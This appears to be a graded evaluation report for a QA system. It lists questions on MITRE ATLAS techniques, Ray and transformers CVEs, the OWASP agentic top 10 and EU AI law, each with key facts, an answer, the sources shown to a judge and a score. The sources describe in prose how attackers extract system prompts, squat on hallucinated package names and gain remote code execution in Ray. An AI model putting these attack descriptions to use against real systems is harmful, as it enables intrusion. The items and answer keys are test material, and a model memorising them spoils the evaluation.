> Victim-owned websites may contain a variety of details, including names of departments/divisions, physical locations, and data about key employees such as names, roles, and contact info.
> These sites may also have details highlighting business operations and relationships.
>
> Adversaries may search victim-owned websites to gather actionable information.
> This information may help adversaries tailor their attacks (e.g. [Adversarial AI Attacks](/techniques/AML.T0017.000) or [Manual Modification](/techniques/AML.T0043.003)).
> Information from these sources may reveal opportunities for other forms of reconnaissance (e.g. [Search Open Technical Databases](/techniques/AML.T0000) or [Search Open AI Vulnerability Analysis](/techniques/AML.T0001))

**AML.T0095**

> Search Open Websites/Domains (technique)
>
> Adversaries may search public websites and/or domains for information about victims and AI targets that can be used during targeting and to discover opportunities for successful attacks. Information about a victim's attack surface may be available in various online sites, such as social media, news sites, or domains owned by the victim.
>
> Adversaries may find the information they seek to gather via search engines. They can use precise search queries to identify software platforms or services used by the victim to use in targeting. This may be followed by [Exploit Public-Facing Application](/techniques/AML.T0049) or [Prompt Infiltration via Public-Facing Application](/techniques/AML.T0093).
>
> Adversaries may utilize OSINT-based discovery to map different AI assets by using search engine result pages, as well as backlink analysis, to locate agentic interfaces (which are frequently embedded via iFrames and follow predictable naming conventions). By analyzing the indexed URL structures of these sources from different search engines, attackers can often reverse-engineer internal environment IDs and organization-specific naming conventions. This intelligence gathering significantly narrows the search space for any later targeted fuzzing or enumeration performed by [Active Scanning: Enumerate Hosted AI Resources](/techniques/AML.T0006.000).

</details>

**Score (1-5):** 5

*Claude's assessment:* All key facts; the extra claim from AML.T0095 is supported by that technique.

*Checked against:* <https://raw.githubusercontent.com/mitre-atlas/atlas-data/main/dist/v6/ATLAS-2026.09.yaml>

---

## 25. Wofür ist die BaFin nach § 2 Abs. 3 KI-MIG zuständig?

<!-- id: de-kimig-2-3:baseline -->

**Key facts**

- Die BaFin ist zuständige Marktüberwachungsbehörde für KI-Systeme in direktem Zusammenhang mit einer regulierten Finanztätigkeit
- Wenn diese von beaufsichtigten Unternehmen in Verkehr gebracht, in Betrieb genommen oder verwendet werden

**Answer**

> Die BaFin ist nach § 2 Abs. 3 KI-MIG Marktüberwachungsbehörde für KI-Systeme, die in direktem Zusammenhang mit einer regulierten Finanztätigkeit stehen und von den dort genannten, BaFin-beaufsichtigten Unternehmen in Verkehr gebracht, in Betrieb genommen oder verwendet werden. Dazu gehören unter anderem Institute, bestimmte Kryptoanbieter und Zahlungsinstitute. [§ 2 Abs. 3 KI-MIG](https://www.gesetze-im-internet.de/ki-mig/BJNR0DF0B0026.html)

**Score (1-5):** 5

*Claude's assessment:* Both key facts, with correct examples of supervised undertakings; nothing false.

*Key-fact note:* Minor gap that does not change the score: § 2 Abs. 3 sentences 2-4 also cover ECB-supervised credit institutions, significant ART issuers moved to the EBA, and the Versorgungsanstalt des Bundes und der Länder.

*Checked against:* <https://www.gesetze-im-internet.de/ki-mig/__2.html>, <https://www.recht.bund.de/bgbl/1/2026/223/regelungstext.pdf>

---

## 26. Can attackers take advantage of ChatGPT suggesting software packages that don't actually exist? How would that work, and has anyone shown it happening in practice?

<!-- id: freshness-aml-cs0022:rag -->

**Key facts**

- LLMs like ChatGPT can hallucinate package names that aren't published in a package repository, and multiple LLMs can produce the same hallucination; an attacker could publish a malicious package under that name so users who download and load it allow arbitrary code execution.
- Researchers found ChatGPT recommending `pip install huggingface-cli`, a package that did not exist on PyPI (the real HuggingFace CLI is part of `huggingface_hub`).
- The researchers uploaded an empty package under the hallucinated name to PyPI and tracked over 30,000 downloads.

**Answer**

> Yes. An attacker could publish a malicious package under a name ChatGPT hallucinates; users who receive the same recommendation may install and execute it, potentially giving the package arbitrary code execution and causing harm. [AML.CS0022](https://atlas.mitre.org/studies/AML.CS0022)
>
> Researchers demonstrated the scenario using the hallucinated `huggingface-cli` package name: they uploaded an **empty** package to PyPI to track downloads and recorded over 30,000 downloads. The source describes this as evidence of the risk, not a demonstration that a malicious package was executed. [AML.CS0022](https://atlas.mitre.org/studies/AML.CS0022)

<details><summary>1 sources the judge saw</summary>

**AML.CS0022**

> ChatGPT Package Hallucination (case study)
>
> Researchers identified that large language models such as ChatGPT can hallucinate fake software package names that are not published to a package repository. An attacker could publish a malicious package under the hallucinated name to a package repository. Then users of the same or similar large language models may encounter the same hallucination and ultimately download and execute the malicious package leading to a variety of potential harms.
>
> Procedure:
> - AML.T0010.001: A user of ChatGPT or other LLM may ask similar questions which lead to the same hallucinated package name and cause them to download the malicious package.  The researchers showed that multiple LLMs can produce the same hallucinations. They tracked over 30,000 downloads of the `huggingface-cli` package.
> - AML.T0011.001: The user would ultimately load the malicious package, allowing for arbitrary code execution.
> - AML.T0040: The researchers use the public ChatGPT API throughout this exercise.
> - AML.T0048.003: This could lead to a variety of harms to the end user or organization.
> - AML.T0060: An adversary could upload a malicious package under the hallucinated name to PyPI or other package registries.  In practice, the researchers uploaded an empty package to PyPI to track downloads.
> - AML.T0062: The researchers prompt ChatGPT to suggest software packages and identify suggestions that are hallucinations which don't exist in a public package repository.  For example, when asking the model "how to upload a model to huggingface?" the response included guidance to install the `huggingface-cli` package with instructions to install it by `pip install huggingface-cli`. This package was a hallucination and does not exist on PyPI. The actual HuggingFace CLI tool is part of the `huggingface_hub` package.

</details>

**Score (1-5):** 4

*Claude's assessment:* Empty package and over 30,000 downloads are stated, and so is the attack; it misses that several LLMs repeat the hallucination, and names huggingface-cli without saying ChatGPT recommended it or that the real CLI is in huggingface_hub.

*Checked against:* <https://raw.githubusercontent.com/mitre-atlas/atlas-data/main/dist/v6/ATLAS-2026.09.yaml>, <https://www.lasso.security/blog/ai-package-hallucinations>

---

## 27. What is AML.T0069.002 (System Prompt) and what does it describe?

<!-- id: id-exact-aml-t0069-002:rag -->

**Key facts**

- AML.T0069.002 is a technique called System Prompt.
- Adversaries may discover a large language model's system instructions provided by the AI system builder.
- The goal is to learn about the system's capabilities and circumvent its guardrails.

**Answer**

> [AML.T0069.002](https://atlas.mitre.org/techniques/AML.T0069.002) is the **System Prompt** technique: adversaries may discover an LLM’s system instructions to learn about its capabilities and circumvent its guardrails.

<details><summary>2 sources the judge saw</summary>

**AML.T0069.002**

> System Prompt (technique)
>
> Adversaries may discover a large language model's system instructions provided by the AI system builder to learn about the system's capabilities and circumvent its guardrails.

**CVE-2026-45351**

> ### Impact
> _1. System prompts can reveal the model instructions, providing an attackers with inside knowledge about the system capabilities and bypass restrictions._
> _2. Attacker can perform content manipulation affecting the input/output of the model._
>
> ### Details from MITRE ATLAS
> Discover LLM System Information - https://atlas.mitre.org/techniques/AML.T0069
> Discover LLM System Information: System Instruction Keywords - https://atlas.mitre.org/techniques/AML.T0069.001
> Discover LLM System Information: System Prompt - https://atlas.mitre.org/techniques/AML.T0069.002
>
> ### Recommendation
> _1. The web response should not reveal system prompt and related internal/back-end details regarding the model to the regular user._
> _2. Only the model name and non-sensitive details should be revealed to regular user and internal/back-end details should not be disclosed._

</details>

**Score (1-5):** 5

*Claude's assessment:* States all three key facts; leaves out only the minor qualifier 'provided by the AI system builder'.

*Key-fact note:* Accurate, but T0069.002 is a sub-technique of AML.T0069 Discover LLM System Information (tactic Discovery). This does not change the score.

*Checked against:* <https://raw.githubusercontent.com/mitre-atlas/atlas-data/main/dist/v6/ATLAS-2026.09.yaml>

---

## 28. What are the first five entries of the OWASP agentic top 10?

<!-- id: list-agentic-first5:rag -->

**Key facts**

- ASI01 Agent Goal Hijack
- ASI02 Tool Misuse and Exploitation
- ASI03 Identity and Privilege Abuse
- ASI04 Agentic Supply Chain Vulnerabilities
- ASI05 Unexpected Code Execution (RCE)

**Answer**

> 1. ASI01 Agent Goal Hijack [OWASP Agentic Top 10 2026](https://genai.owasp.org/resource/owasp-top-10-for-agentic-applications-for-2026/)
> 2. ASI02 Tool Misuse and Exploitation [OWASP Agentic Top 10 2026](https://genai.owasp.org/resource/owasp-top-10-for-agentic-applications-for-2026/)
> 3. ASI03 Identity and Privilege Abuse [OWASP Agentic Top 10 2026](https://genai.owasp.org/resource/owasp-top-10-for-agentic-applications-for-2026/)
> 4. ASI04 Agentic Supply Chain Vulnerabilities [OWASP Agentic Top 10 2026](https://genai.owasp.org/resource/owasp-top-10-for-agentic-applications-for-2026/)
> 5. ASI05 Unexpected Code Execution (RCE) [OWASP Agentic Top 10 2026](https://genai.owasp.org/resource/owasp-top-10-for-agentic-applications-for-2026/)

<details><summary>1 sources the judge saw</summary>

**OWASP Agentic Top 10 2026**

> The OWASP Top 10 for Agentic Applications 2026 lists these risks, by number:
> ASI01 Agent Goal Hijack: AI Agents exhibit autonomous ability to execute a series of tasks to achieve a goal.
> ASI02 Tool Misuse and Exploitation: Agents can misuse legitimate tools due to prompt injection, misalignment, or unsafe delegation or ambiguous instruction - leading to data exfiltration, tool…
> ASI03 Identity and Privilege Abuse: Identity & Privilege Abuse exploits dynamic trust and delegation in agents to escalate access and bypass controls by manipulating delegation chains, role…
> ASI04 Agentic Supply Chain Vulnerabilities: Agentic Supply Chain Vulnerabilities arise when agents, tools, and related artefacts they work with are provided by third parties and may be malicious,…
> ASI05 Unexpected Code Execution (RCE): Agentic systems - including popular vibe coding tools - often generate and execute code.
> ASI06 Memory & Context Poisoning: Agentic systems rely on stored and retrievable information which can be a snapshot of its conversation history, a memory tool or expanded context, which…
> ASI07 Insecure Inter-Agent Communication: Multi agent systems depend on continuous communication between autonomous agents that coordinate via APIs, message buses, and shared memory, significantly…
> ASI08 Cascading Failures: Agentic cascading failures occur when a single fault (hallucination, malicious input, corrupted tool, or poisoned memory) propagates across autonomous agents,…
> ASI09 Human-Agent Trust Exploitation: Intelligent agents can establish strong trust with human users through their natural language fluency, emotional intelligence, and perceived expertise, known…
> ASI10 Rogue Agents: Rogue Agents are malicious or compromised AI Agents that deviate from their intended function or authorized scope, acting harmfully, deceptively, or…

</details>

**Score (1-5):** 5

*Claude's assessment:* ASI01 to ASI05, with correct names and order.

*Checked against:* <https://genai.owasp.org/resource/owasp-top-10-for-agentic-applications-for-2026/>

---

## 29. Which Ray vulnerability is listed by CISA as known exploited, and how is it exploited?

<!-- id: cve-ray-kev:rag -->

**Key facts**

- CVE-2025-62593: critical remote code execution in Ray via Safari and Firefox browsers through a DNS rebinding attack
- Listed in CISA KEV
- Fixed in ray 2.52.0

**Answer**

> CISA lists **CVE-2025-62593** as known exploited. [CVE-2025-62593](https://nvd.nist.gov/vuln/detail/CVE-2025-62593) Attackers can use DNS rebinding through Firefox or Safari when a developer running Ray visits a malicious website or is served a malicious ad; this can bypass the weak browser-request check and enable remote code execution against the Ray instance. [CVE-2025-62593](https://nvd.nist.gov/vuln/detail/CVE-2025-62593)

<details><summary>1 sources the judge saw</summary>

**CVE-2025-62593**

> Affected: ray (PyPI) all versions, fixed in 2.52.0
> CVSS: 9.4 CRITICAL (CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X)
> CWE: CWE-352, CWE-94
> CISA KEV: yes, added 2026-08-17
> Published: 2025-11-26
> Aliases: GHSA-q279-jhrf-cc6v, PYSEC-2026-520
>
> Ray is vulnerable to Critical RCE via Safari & Firefox Browsers through DNS Rebinding Attack
>
> # Summary
>
> Developers working with Ray as a development tool can be exploited via a critical RCE vulnerability exploitable via Firefox and Safari.
>
> Due to the longstanding [decision](https://docs.ray.io/en/releases-2.51.1/ray-security/index.html) by the Ray Development team to not implement any sort of authentication on critical endpoints, like the `/api/jobs` & `/api/job_agent/jobs/` has once again led to a severe vulnerability that allows attackers to execute arbitrary code against Ray. This time in a development context via the browsers Firefox and Safari.
>
> This vulnerability is due to an insufficient guard against browser-based attacks, as the current defense uses the `User-Agent` header starting with the string "Mozilla" as a defense mechanism. This defense is insufficient as the fetch specification allows the `User-Agent` header to be modified.
>
> Combined with a DNS rebinding attack against the browser, and this vulnerability is exploitable against a developer running Ray who inadvertently visits a malicious website, or is served a malicious advertisement ([malvertising](https://en.wikipedia.org/wiki/Malvertising)).
>
> # Details
>
> The mitigations implemented to protect against browser based attacks against local Ray nodes are insufficient.
>
> ## Current Mitigation Strategies
>
> ```python
> def is_browser_request(req: Request) -> bool:
> """Checks if a request is made by a browser like user agent.
>
> This heuristic is very weak, but hard for a browser to bypass- eg,
> fetch/xhr and friends cannot alter the user-agent, but requests made with
> an http library can stumble into this if they choose to user a browser like
> user agent.
> """
> return req.headers["User-Agent"].startswith("Mozilla")
>
> def deny_browser_requests() -> Callable:
> """Reject any requests that appear to be made by a browser"""

</details>

**Score (1-5):** 4

*Claude's assessment:* Correctly names CVE-2025-62593 as the KEV-listed Ray flaw and describes the DNS-rebinding RCE via Firefox/Safari accurately; misses the fix in ray 2.52.0.

*Checked against:* <https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json>, <https://github.com/advisories/GHSA-q279-jhrf-cc6v>, <https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2025-62593>

---

## 30. Which ATLAS mitigations address Erode Dataset Integrity (AML.T0059)?

<!-- id: join-t0059-mitigations:rag -->

**Key facts**

- AML.M0007 Sanitize Training Data mitigates AML.T0059
- AML.M0025 Maintain AI Dataset Provenance mitigates AML.T0059

**Answer**

> The ATLAS mitigations are [Sanitize Training Data](https://atlas.mitre.org/mitigations/AML.M0007) and [Maintain AI Dataset Provenance](https://atlas.mitre.org/mitigations/AML.M0025).

<details><summary>3 sources the judge saw</summary>

**AML.T0059**

> Erode Dataset Integrity (technique)
>
> Adversaries may poison or manipulate portions of a dataset to reduce its usefulness, reduce trust, and cause users to waste resources correcting errors.

**AML.M0007**

> Sanitize Training Data (mitigation)
>
> Detect and remove or remediate poisoned training data. Training data should be sanitized prior to model training and recurrently for an active learning model.
>
> Implement a filter to limit ingested training data. Establish a content policy that would remove unwanted content such as certain explicit or offensive language from being used.

**AML.M0025**

> Maintain AI Dataset Provenance (mitigation)
>
> Maintain a detailed history of datasets used for AI applications. The history should include information about the dataset's source as well as a complete record of any modifications.

</details>

**Score (1-5):** 5

*Claude's assessment:* Gives both mitigations of AML.T0059 (M0007, M0025), which are the only ones in the source.

*Checked against:* <https://raw.githubusercontent.com/mitre-atlas/atlas-data/main/dist/v6/ATLAS-2026.09.yaml>

---

## 31. What is CVE-2024-11392 about? Which package does it affect, what can an attacker do with it, and which version fixes it?

<!-- id: cve-cve-2024-11392:baseline -->

**Key facts**

- It affects the Hugging Face Transformers package (transformers on PyPI), all versions before the fix.
- It is a deserialization of untrusted data flaw (CWE-502) in the handling of MobileViTV2 configuration files that lets remote attackers execute arbitrary code in the context of the current user, but only if the target opens a malicious file or visits a malicious page.
- It is fixed in transformers version 4.48.0.

**Answer**

> CVE-2024-11392 is an **unsafe deserialization** flaw in the Hugging Face **`transformers`** package, in its handling of MobileViTV2 configuration files [CVE-2024-11392] [CWE-502].
>
> An attacker can craft a malicious file or page that, if opened by a user, may let the attacker run arbitrary code with that user’s permissions. Versions before **4.48.0** are affected; **4.48.0** fixes the issue. [ZDI advisory](https://www.zerodayinitiative.com/advisories/ZDI-24-1513/) [GitLab advisory](https://advisories.gitlab.com/pypi/transformers/CVE-2024-11392/)

**Score (1-5):** 5

*Claude's assessment:* All key facts (transformers < 4.48.0, CWE-502 in MobileViTV2 config handling, RCE with user interaction, fixed in 4.48.0); no false claims.

*Checked against:* <https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2024-11392>, <https://github.com/advisories/GHSA-qxrp-vhvm-j765>, <https://www.zerodayinitiative.com/advisories/ZDI-24-1513/>

---

## 32. Wie definiert die KI-Verordnung ein KI-System?

<!-- id: de-art-3-1:rag -->

**Key facts**

- Ein maschinengestütztes System, das für einen in unterschiedlichem Grade autonomen Betrieb ausgelegt ist und nach der Betriebsaufnahme anpassungsfähig sein kann
- Es leitet aus den erhaltenen Eingaben ab, wie Ausgaben wie Vorhersagen, Inhalte, Empfehlungen oder Entscheidungen erstellt werden, die physische oder virtuelle Umgebungen beeinflussen können

**Answer**

> „KI-System“ ist „ein maschinengestütztes System, das für einen in unterschiedlichem Grade autonomen Betrieb ausgelegt ist und das nach seiner Betriebsaufnahme anpassungsfähig sein kann und das aus den erhaltenen Eingaben für explizite oder implizite Ziele ableitet, wie Ausgaben wie etwa Vorhersagen, Inhalte, Empfehlungen oder Entscheidungen erstellt werden, die physische oder virtuelle Umgebungen beeinflussen können“. [AI Act Art. 3(1)](https://eur-lex.europa.eu/legal-content/DE/TXT/HTML/?uri=CELEX:02024R1689-20260727#art_3)

<details><summary>8 sources the judge saw</summary>

**Recital 53**

> Ferner muss klargestellt werden, dass es bestimmte Fälle geben kann, in denen KI-Systeme für vordefinierte in dieser Verordnung festgelegte Bereiche nicht zu einem bedeutenden Risiko der Beeinträchtigung der in diesen Bereichen geschützten rechtlichen Interessen führen, da sie die Entscheidungsfindung nicht wesentlich beeinflussen oder diesen Interessen nicht erheblich schaden. Für die Zwecke dieser Verordnung sollte ein KI-System, das das Ergebnis der Entscheidungsfindung nicht wesentlich beeinflusst, als ein KI-System verstanden werden, das keine Auswirkungen auf den Inhalt und damit das Ergebnis der Entscheidungsfindung hat, unabhängig davon, ob es sich um menschliche oder automatisierte Entscheidungen handelt. Ein KI-System, das das Ergebnis der Entscheidungsfindung nicht wesentlich beeinflusst, könnte Situationen einschließen, in denen eine oder mehrere der folgenden Bedingungen erfüllt sind. Die erste dieser Bedingungen ist, dass das KI-System dazu bestimmt ist, in einem Verfahren eine eng gefasste Aufgabe zu erfüllen, wie etwa ein KI-System, das unstrukturierte Daten in strukturierte Daten umwandelt, ein KI-System, das eingehende Dokumente in Kategorien einordnet, oder ein KI-System, das zur Erkennung von Duplikaten unter einer großen Zahl von Anwendungen eingesetzt wird. Diese Aufgaben sind so eng gefasst und begrenzt, dass sie nur beschränkte Risiken darstellen, die sich durch die Verwendung eines KI-Systems in einem Kontext, der in einem Anhang dieser Verordnung als Verwendung mit hohem Risiko aufgeführt ist, nicht erhöhen. Die zweite Bedingung sollte darin bestehen, dass die von einem KI-System ausgeführte Aufgabe das Ergebnis einer zuvor abgeschlossenen menschlichen Tätigkeit verbessert, die für die Zwecke der in einem Anhang dieser Verordnung aufgeführten Verwendungen mit hohem Risiko relevant sein kann. Unter Berücksichtigung dieser Merkmale wird eine menschliche Tätigkeit durch das KI-System lediglich durch eine zusätzliche Ebene ergänzt und stellt daher ein geringeres Risiko dar. Diese Bedingung würde beispielsweise für KI-Systeme gelten, deren Ziel es ist, die in zuvor verfassten Dokumenten verwendete Sprache zu verbessern, etwa den professionellen Ton, den wissenschaftlichen Sprachstil oder um den Text an einen bestimmten mit einer Marke verbundenen Stil anzupassen. Dritte Bedingung sollte sein, dass mit dem KI-System Entscheidungsmuster oder Abweichungen von früheren Entscheidungsmustern erkannt werden sollen

**AI Act Art. 3(1)**

> (1) „KI-System“ ein maschinengestütztes System, das für einen in unterschiedlichem Grade autonomen Betrieb ausgelegt ist und das nach seiner Betriebsaufnahme anpassungsfähig sein kann und das aus den erhaltenen Eingaben für explizite oder implizite Ziele ableitet, wie Ausgaben wie etwa Vorhersagen, Inhalte, Empfehlungen oder Entscheidungen erstellt werden, die physische oder virtuelle Umgebungen beeinflussen können;

**Recital 18**

> Der in dieser Verordnung verwendete Begriff „Emotionserkennungssystem“ sollte als ein KI-System definiert werden, das dem Zweck dient, Emotionen oder Absichten natürlicher Personen auf der Grundlage ihrer biometrischen Daten festzustellen oder daraus abzuleiten. In diesem Begriff geht es um Emotionen oder Absichten wie Glück, Trauer, Wut, Überraschung, Ekel, Verlegenheit, Aufregung, Scham, Verachtung, Zufriedenheit und Vergnügen. Dies umfasst nicht physische Zustände wie Schmerz oder Ermüdung, einschließlich beispielsweise Systeme, die zur Erkennung des Zustands der Ermüdung von Berufspiloten oder -fahrern eigesetzt werden, um Unfälle zu verhindern. Es geht dabei auch nicht um die bloße Erkennung offensichtlicher Ausdrucksformen, Gesten und Bewegungen, es sei denn, sie werden zum Erkennen oder Ableiten von Emotionen verwendet. Bei diesen Ausdrucksformen kann es sich um einfache Gesichtsausdrücke wie ein Stirnrunzeln oder ein Lächeln oder um Gesten wie Hand-, Arm- oder Kopfbewegungen oder um die Stimmmerkmale einer Person handeln, wie eine erhobene Stimme oder ein Flüstern.

**Recital 12**

> Der Begriff „KI-System“ in dieser Verordnung sollte klar definiert und eng mit der Tätigkeit internationaler Organisationen abgestimmt werden, die sich mit KI befassen, um Rechtssicherheit, mehr internationale Konvergenz und hohe Akzeptanz sicherzustellen und gleichzeitig Flexibilität zu bieten, um den raschen technologischen Entwicklungen in diesem Bereich Rechnung zu tragen. Darüber hinaus sollte die Begriffsbestimmung auf den wesentlichen Merkmalen der KI beruhen, die sie von einfacheren herkömmlichen Softwaresystemen und Programmierungsansätzen abgrenzen, und sollte sich nicht auf Systeme beziehen, die auf ausschließlich von natürlichen Personen definierten Regeln für das automatische Ausführen von Operationen beruhen. Ein wesentliches Merkmal von KI-Systemen ist ihre Fähigkeit, abzuleiten. Diese Fähigkeit bezieht sich auf den Prozess der Erzeugung von Ausgaben, wie Vorhersagen, Inhalte, Empfehlungen oder Entscheidungen, die physische und digitale Umgebungen beeinflussen können, sowie auf die Fähigkeit von KI-Systemen, Modelle oder Algorithmen oder beides aus Eingaben oder Daten abzuleiten. Zu den Techniken, die während der Gestaltung eines KI-Systems das Ableiten ermöglichen, gehören Ansätze für maschinelles Lernen, wobei aus Daten gelernt wird, wie bestimmte Ziele erreicht werden können, sowie logik- und wissensgestützte Konzepte, wobei aus kodierten Informationen oder symbolischen Darstellungen der zu lösenden Aufgabe abgeleitet wird. Die Fähigkeit eines KI-Systems, abzuleiten, geht über die einfache Datenverarbeitung hinaus, indem Lern-, Schlussfolgerungs- und Modellierungsprozesse ermöglicht werden. Die Bezeichnung „maschinenbasiert“ bezieht sich auf die Tatsache, dass KI-Systeme von Maschinen betrieben werden. Durch die Bezugnahme auf explizite oder implizite Ziele wird betont, dass KI-Systeme gemäß explizit festgelegten Zielen oder gemäß impliziten Zielen arbeiten können. Die Ziele des KI-Systems können sich — unter bestimmten Umständen — von der Zweckbestimmung des KI-Systems unterscheiden. Für die Zwecke dieser Verordnung sollten Umgebungen als Kontexte verstanden werden, in denen KI-Systeme betrieben werden, während die von einem KI-System erzeugten Ausgaben verschiedene Funktionen von KI-Systemen widerspiegeln, darunter Vorhersagen, Inhalte, Empfehlungen oder Entscheidungen

**Recital 17**

> Der in dieser Verordnung verwendete Begriff „biometrisches Fernidentifizierungssystem“ sollte funktional definiert werden als KI-System, das dem Zweck dient, natürliche Personen ohne ihre aktive Einbeziehung in der Regel aus der Ferne durch Abgleich der biometrischen Daten einer Person mit den in einer Referenzdatenbank gespeicherten biometrischen Daten zu identifizieren, unabhängig davon, welche Technologie, Verfahren oder Arten biometrischer Daten dazu verwendet werden. Diese biometrischen Fernidentifizierungssysteme werden in der Regel zur zeitgleichen Erkennung mehrerer Personen oder ihrer Verhaltensweisen verwendet, um die Identifizierung natürlicher Personen ohne ihre aktive Einbeziehung erheblich zu erleichtern. Dies umfasst keine KI-Systeme, die bestimmungsgemäß für die biometrische Verifizierung, wozu die Authentifizierung gehört, verwendet werden sollen, deren einziger Zweck darin besteht, zu bestätigen, dass eine bestimmte natürliche Person die Person ist, für die sie sich ausgibt, sowie zur Bestätigung der Identität einer natürlichen Person zu dem alleinigen Zweck Zugang zu einem Dienst zu erhalten, ein Gerät zu entriegeln oder Sicherheitszugang zu Räumlichkeiten zu erhalten. Diese Ausnahme wird damit begründet, dass diese Systeme im Vergleich zu biometrischen Fernidentifizierungssystemen, die zur Verarbeitung biometrischer Daten einer großen Anzahl von Personen ohne ihre aktive Einbeziehung verwendet werden können, geringfügige Auswirkungen auf die Grundrechte natürlicher Personen haben dürften. Bei „Echtzeit-Systemen“ erfolgen die Erfassung der biometrischen Daten, der Abgleich und die Identifizierung zeitgleich, nahezu zeitgleich oder auf jeden Fall ohne erhebliche Verzögerung. In diesem Zusammenhang sollte es keinen Spielraum für eine Umgehung der Bestimmungen dieser Verordnung über die „Echtzeit-Nutzung“ der betreffenden KI-Systeme geben, indem kleinere Verzögerungen vorgesehen werden. „Echtzeit-Systeme“ umfassen die Verwendung von „Live-Material“ oder „Near-live-Material“ wie etwa Videoaufnahmen, die von einer Kamera oder einem anderen Gerät mit ähnlicher Funktion erzeugt werden. Bei Systemen zur nachträglichen Identifizierung hingegen wurden die biometrischen Daten schon zuvor erfasst und der Abgleich und die Identifizierung erfolgen erst mit erheblicher Verzögerung

**AI Act Art. 3(66)**

> (66) „KI-System mit allgemeinem Verwendungszweck“ ein KI-System, das auf einem KI-Modell mit allgemeinem Verwendungszweck beruht und in der Lage ist, einer Vielzahl von Zwecken sowohl für die direkte Verwendung als auch für die Integration in andere KI-Systeme zu dienen;

**Recital 24**

> In diesen Fällen sollte sich die Tatsache, dass ein KI-System in den Anwendungsbereich dieser Verordnung fällt, nicht darauf auswirken, dass Einrichtungen, die Tätigkeiten in den Bereichen nationale Sicherheit, Verteidigung oder Militär ausüben, KI-Systeme für Zwecke in den Bereichen nationale Sicherheit, Militär und Verteidigung verwenden können, unabhängig von der Art der Einrichtung, die diese Tätigkeiten ausübt, wobei die Verwendung vom Anwendungsbereich dieser Verordnung ausgenommen ist. Ein KI-System, das für zivile Zwecke oder Strafverfolgungszwecke in Verkehr gebracht wurde und mit oder ohne Änderungen für Zwecke in den Bereichen Militär, Verteidigung oder nationale Sicherheit verwendet wird, sollte nicht in den Anwendungsbereich dieser Verordnung fallen, unabhängig von der Art der Einrichtung, die diese Tätigkeiten ausübt.

**AI Act Art. 3(41)**

> (41) „biometrisches Fernidentifizierungssystem“ ein KI-System, das dem Zweck dient, natürliche Personen ohne ihre aktive Einbeziehung und in der Regel aus der Ferne durch Abgleich der biometrischen Daten einer Person mit den in einer Referenzdatenbank gespeicherten biometrischen Daten zu identifizieren;

</details>

**Score (1-5):** 5

*Claude's assessment:* Quotes the full German Art. 3 Nr. 1 definition word for word.

*Checked against:* <https://publications.europa.eu/resource/celex/02024R1689-20260727>

---

## 33. Which Ray versions are affected by CVE-2026-41486, what can an attacker do with it, and which version fixes it?

<!-- id: cve-cve-2026-41486:rag -->

**Key facts**

- The affected package is ray (PyPI), versions 2.49.0 through 2.54.0, and the fix is in Ray 2.55.0.
- A crafted Parquet file read by a process using Ray Data causes arbitrary code execution, because Ray passes Arrow extension type metadata directly to cloudpickle.loads() during schema parsing.
- No authentication or cluster access is required; the attacker only needs to place the crafted Parquet file where a Ray Data pipeline reads it.

**Answer**

> CVE-2026-41486 affects Ray **2.49.0–2.54.0** and is fixed in **2.55.0**. [CVE-2026-41486](https://nvd.nist.gov/vuln/detail/CVE-2026-41486)
>
> An attacker can place a crafted Parquet file where a Ray Data pipeline reads it, triggering arbitrary code execution during schema parsing—before any row data is read. [CVE-2026-41486](https://nvd.nist.gov/vuln/detail/CVE-2026-41486)
>
> Note: the source’s summary metadata also says “all versions, no fix listed,” which conflicts with its detailed version information. [CVE-2026-41486](https://nvd.nist.gov/vuln/detail/CVE-2026-41486)

<details><summary>4 sources the judge saw</summary>

**CVE-2026-41486**

> Affected: ray (PyPI) >= 2.49.0, fixed in 2.55.0; ray (PyPI) all versions, no fix listed
> CVSS: 8.9 HIGH (CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:A/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X)
> CWE: CWE-502, CWE-94
> CISA KEV: no
> Published: 2026-04-24
> Aliases: GHSA-mw35-8rx3-xf9r, PYSEC-2026-2272, PYSEC-2026-2296
>
> Ray: Remote Code Execution via Parquet Arrow Extension Type Deserialization
>
> Ray Data registers custom Arrow extension types (`ray.data.arrow_tensor`, `ray.data.arrow_tensor_v2`, `ray.data.arrow_variable_shaped_tensor`) globally in PyArrow. When PyArrow reads a Parquet file containing one of these extension types, it calls `__arrow_ext_deserialize__` on the field's metadata bytes. Ray's implementation passes these bytes directly to `cloudpickle.loads()`, achieving arbitrary code execution during schema parsing, before any row data is read.
>
> In May 2024, Ray fixed a related vulnerability in `PyExtensionType`-based extension types ([issue #41314](https://github.com/ray-project/ray/issues/41314), [PR #45084](https://github.com/ray-project/ray/pull/45084)). In July 2025, [PR #54831](https://github.com/ray-project/ray/pull/54831) introduced `cloudpickle.loads()` into the replacement extension types' deserialization path, reintroducing the same class of vulnerability.
>
> ## Impact
>
> - **Affected versions**: Ray 2.49.0 through 2.54.0 (latest release as of March 2026). The vulnerable `_deserialize_with_fallback` function with `cloudpickle.loads()` was introduced in commit `f6d21db1a4` ([PR #54831](https://github.com/ray-project/ray/pull/54831), July 2025), first released in Ray 2.49.0.
> - **Affected configurations**: Any process that uses Ray Data and reads Parquet files. The extension types are registered globally in PyArrow, so all Parquet reads in the process are affected, including `ray.data.read_parquet()`, `pyarrow.parquet.read_table()`, `pandas.read_parquet()`, etc.
> - **Attacker prerequisites**: The attacker must place a crafted Parquet file where a Ray Data pipeline reads it. No authentication or cluster access is required. The Parquet file must contain a column with a `ray.data.arrow_tensor` (or v2, or variable-shaped) extension type name, which makes this a targeted attack against Ray Data users.

**CVE-2025-62593**

> Affected: ray (PyPI) all versions, fixed in 2.52.0
